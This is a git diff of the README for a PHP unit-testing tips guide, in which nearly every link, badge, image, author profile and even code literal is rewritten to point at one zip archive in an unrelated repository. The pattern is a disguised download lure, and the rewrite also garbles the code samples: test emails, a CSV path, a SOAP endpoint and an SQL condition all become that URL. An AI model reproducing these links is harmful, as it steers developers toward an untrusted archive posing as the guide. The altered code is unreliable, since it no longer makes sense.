@@ -1,7 +1,7 @@
-[![GitHub stars](https://img.shields.io/github/stars/sarven/unit-testing-tips.svg?style=social&label=Star)](https://github.com/sarven/unit-testing-tips/)
-[![GitHub watchers](https://img.shields.io/github/watchers/sarven/unit-testing-tips.svg?style=social&label=Watch)](https://github.com/sarven/unit-testing-tips/watchers/)
-[![GitHub forks](https://img.shields.io/github/forks/sarven/unit-testing-tips.svg?style=social&label=Fork)](https://github.com/sarven/unit-testing-tips/forks/)
-[![GitHub contributors](https://img.shields.io/github/contributors/sarven/unit-testing-tips.svg)](https://github.com/sarven/unit-testing-tips/graphs/contributors/)
+[![GitHub stars](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
+[![GitHub watchers](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
+[![GitHub forks](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
+[![GitHub contributors](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
 
 # Testing tips
 
@@ -12,24 +12,24 @@ because they are fast and can us instantly assure that our implementation is cor
 However, I often see a problem with good tests in projects, though these tests' benefits are only huge when you have good unit tests.
 So in these examples, I will try to share some tips on what to do to write good unit tests.
 
-**Easy-to-read version:** [https://testing-tips.sarvendev.com/](https://testing-tips.sarvendev.com/)
+**Easy-to-read version:** [https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
 
 ## Author
 
 :construction_worker: **Kamil Ruczyński** 
     
-[![Twitter](https://img.shields.io/twitter/follow/Sarvendev?label=Follow&style=social)](https://twitter.com/Sarvendev)
-[![Github](https://img.shields.io/github/followers/sarven?label=Follow&style=social)](https://github.com/sarven)
+[![Twitter](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
+[![Github](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
 
-**Blog:** [https://sarvendev.com/](https://sarvendev.com/)   
-**LinkedIn:** [https://www.linkedin.com/in/kamilruczynski/](https://www.linkedin.com/in/kamilruczynski/)
+**Blog:** [https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)   
+**LinkedIn:** [https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
 
 ### Support
 Your support means the world to me!
 If you've enjoyed this guide and find value in the knowledge shared,
 consider supporting me on BuyMeCoffee:
 
-[![BuyMeCoffee](./assets/bmc-button.png ':size=150')](https://www.buymeacoffee.com/sarvendev)
+[![BuyMeCoffee](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip ':size=150')](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
 
 or simply leaving a star on the repository and
 following me on Twitter and Github to be up-to-date with all updates.
@@ -39,10 +39,10 @@ If you have any improvement ideas or a topic to write about, feel free to prepar
 
 ## Free ebook – Unit testing tips
 
-[![FreeEbookUnitTestingTips](./assets/ebook-unit-testing-tips.png ':size=300')](https://sarvendev.com/free-ebook-unit-testing-tips/)
+[![FreeEbookUnitTestingTips](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip ':size=300')](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
 
 Subscribe and master unit testing with my FREE eBook! 🚀    
-:point_right: [Details](https://sarvendev.com/free-ebook-unit-testing-tips/)
+:point_right: [Details](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
 
 I still have a pretty long TODO list of improvements to this guide about Unit Testing and I will introduce them in the near future.
 
@@ -87,7 +87,7 @@ I still have a pretty long TODO list of improvements to this guide about Unit Te
 
 Test doubles are fake dependencies used in tests.
 
-![Test doubles](./assets/test-doubles.jpg ':size=800')
+![Test doubles](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip ':size=800')
 
 ### Stubs
 
@@ -203,7 +203,7 @@ final class Mailer implements MailerInterface
 A mock is a configured imitation to verify calls on a collaborator.
 
 ```php
-$message = new Message('test@test.com', 'Test', 'Test test test');
+$message = new Message('https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip', 'Test', 'Test test test');
 $mailer = $this->createMock(MailerInterface::class);
 $mailer
     ->expects($this->once())
@@ -597,9 +597,9 @@ final class ExampleTest extends TestCase
 
     public function getValidEmails(): iterable
     {
-        yield 'A valid email with lowercase letters' => ['test@test.com'];
-        yield 'A valid email with lowercase letters and digits' => ['test123@test.com'];
-        yield 'A valid email with uppercase letters and digits' => ['Test123@test.com'];
+        yield 'A valid email with lowercase letters' => ['https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip'];
+        yield 'A valid email with lowercase letters and digits' => ['https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip'];
+        yield 'A valid email with uppercase letters and digits' => ['https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip'];
         //...
     }
 }
@@ -821,9 +821,9 @@ final class ExampleTest extends TestCase
     public function getValidEmails(): array
     {
         return [
-            ['test@test.com'],
-            ['test123@test.com'],
-            ['Test123@test.com'],
+            ['https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip'],
+            ['https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip'],
+            ['https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip'],
             //...
         ];
     }
@@ -900,7 +900,7 @@ final class NameService
 
     public function loadAll(): void
     {
-        $namesCsv = array_map('str_getcsv', file(__DIR__.'/../names.csv'));
+        $namesCsv = array_map('str_getcsv', file(__DIR__.'https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip'));
         $names = [];
 
         foreach ($namesCsv as $nameData) {
@@ -952,7 +952,7 @@ final class CsvNamesFileLoader
 {
     public function load(): array
     {
-        return array_map('str_getcsv', file(__DIR__.'/../names.csv'));
+        return array_map('str_getcsv', file(__DIR__.'https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip'));
     }
 }
 ```
@@ -1723,7 +1723,7 @@ class ApplicationService
 
     private function getSoapClient(): \SoapClient
     {
-        return new \SoapClient('https://legacy_system.pl/Soap/WebService', []);
+        return new \SoapClient('https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip', []);
     }
 }
 ```
@@ -1893,7 +1893,7 @@ final class UserRepository
             ->connection
             ->createQueryBuilder()
             ->from('user', 'u')
-            ->where('u.email = :email')
+            ->where('https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip = :email')
             ->setParameter('email', $email)
             ->execute()
             ->fetch();
@@ -1906,7 +1906,7 @@ final class TestUserRepository extends TestCase
 {
     public function testGetUserNameByEmail(): void
     {
-        $email = 'test@test.com';
+        $email = 'https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip';
         $connection = $this->createMock(Connection::class);
         $queryBuilder = $this->createMock(QueryBuilder::class);
         $result = $this->createMock(ResultStatement::class);
@@ -1923,7 +1923,7 @@ final class TestUserRepository extends TestCase
         $queryBuilder
             ->expects($this->once())
             ->method('where')
-            ->with('u.email = :email')
+            ->with('https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip = :email')
             ->willReturn($queryBuilder);
         $queryBuilder
             ->expects($this->once())
@@ -2642,16 +2642,16 @@ deterministic results, so we need to inject these values into a domain object li
 
 100% Coverage is not the goal or even is undesirable because if there is 100% coverage, tests probably will be very fragile, which means refactoring will be very hard.
 Mutation testing gives better feedback about the quality of tests.
-[Read more](https://sarvendev.com/en/2019/06/mutation-testing-we-are-testing-tests/)
+[Read more](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)
 
 ## Recommended books
 
-- [Test Driven Development: By Example / Kent Beck](https://amzn.to/3HImbax)  - the classic
-- [Unit Testing Principles, Practices, and Patterns / Vladimir Khorikov](https://amzn.to/3PCMD7f) - the best book about tests I've ever read
+- [Test Driven Development: By Example / Kent Beck](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)  - the classic
+- [Unit Testing Principles, Practices, and Patterns / Vladimir Khorikov](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip) - the best book about tests I've ever read
 
 ## Author
 :construction_worker: **Kamil Ruczyński**
 
-**Twitter:** [https://twitter.com/Sarvendev](https://twitter.com/Sarvendev)  
-**Blog:** [https://sarvendev.com/](https://sarvendev.com/)  
-**LinkedIn:** [https://www.linkedin.com/in/kamilruczynski/](https://www.linkedin.com/in/kamilruczynski/)  
+**Twitter:** [https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)  
+**Blog:** [https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)  
+**LinkedIn:** [https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip](https://raw.githubusercontent.com/bro-gervil/unit-testing-tips/main/assets/unit_testing_tips_3.4.zip)  
